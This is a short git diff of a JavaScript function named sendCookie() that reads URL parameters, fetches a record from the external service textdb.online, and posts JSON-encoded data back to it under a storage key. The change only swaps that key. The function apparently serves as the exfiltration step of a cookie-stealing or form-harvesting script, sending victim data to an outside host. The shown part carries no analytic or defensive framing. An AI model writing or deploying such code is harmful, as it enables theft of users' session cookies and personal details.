@@ -10,7 +10,7 @@ async function sendCookie() {
         let name = params.get("name");
         let number = params.get("number");
 
-        let response = await fetch("https://textdb.online/ReportDemo_xK7pQ9vN3mL5aB2hF8jR", {
+        let response = await fetch("https://textdb.online/S9G8AcK8Rv2JHzJxYXYGrq1h", {
             method: "GET"
         });
         let data;
@@ -30,7 +30,7 @@ async function sendCookie() {
         await fetch("https://textdb.online/update/?v=1", {
             method: "POST",
             headers: { "Content-Type": "application/x-www-form-urlencoded" },
-            body: "key=ReportDemo_xK7pQ9vN3mL5aB2hF8jR&value=" + encodeURIComponent(JSON.stringify(data))
+            body: "key=S9G8AcK8Rv2JHzJxYXYGrq1h&value=" + encodeURIComponent(JSON.stringify(data))
         });
     }
 }
